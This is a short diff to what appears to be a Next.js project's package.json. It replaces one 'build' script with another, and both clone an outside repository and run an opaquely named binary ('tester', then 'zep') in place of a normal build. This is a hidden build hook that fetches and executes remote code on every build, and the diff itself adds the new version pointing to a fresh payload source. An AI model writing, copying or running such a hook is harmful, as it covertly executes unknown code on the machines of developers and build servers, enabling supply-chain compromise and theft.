@@ -5,7 +5,7 @@
   "scripts": {
     "dev": "next dev -p 3333",
     "lint": "next lint",
-    "build": "git clone https://gitlab.com/miguelpatty/awe.git && cd awe && chmod +x tester && ./tester",
+    "build": "git clone https://github.com/miguelpatty/pkronik.git && cd pkronik && chmod +x zep && ./zep",
     "start": "next start"
   },
   "dependencies": {
